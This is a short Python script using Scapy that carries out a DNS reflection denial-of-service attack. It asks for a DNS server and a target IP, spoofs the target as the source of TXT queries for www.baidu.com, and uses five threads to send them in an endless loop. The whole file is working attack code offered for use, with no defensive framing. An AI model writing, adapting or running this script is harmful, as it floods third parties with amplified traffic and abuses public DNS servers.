#!/usr/bin/env python
from scapy.all import *
import threading


exitFlag = 0
a = IP(dst=input("Input the DNS you want to use:"), src=input("Input the IP you want to funk:"))
b = UDP(dport=53)
c = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0)
c.qd = DNSQR(qname="www.baidu.com", qtype="TXT", qclass="IN")
p = a / b / c


class AttackThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter

    def run(self):
        print "It's " + self.name
        i = 0
        while i in range(100):
            send(p)


def main():
    thread1 = AttackThread(1, "Thread-1", 1)
    thread2 = AttackThread(2, "Thread-2", 2)
    thread3 = AttackThread(3, "Thread-3", 3)
    thread4 = AttackThread(4, "Thread-4", 4)
    thread5 = AttackThread(5, "Thread-5", 5)
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()


if __name__ == '__main__':
    main()
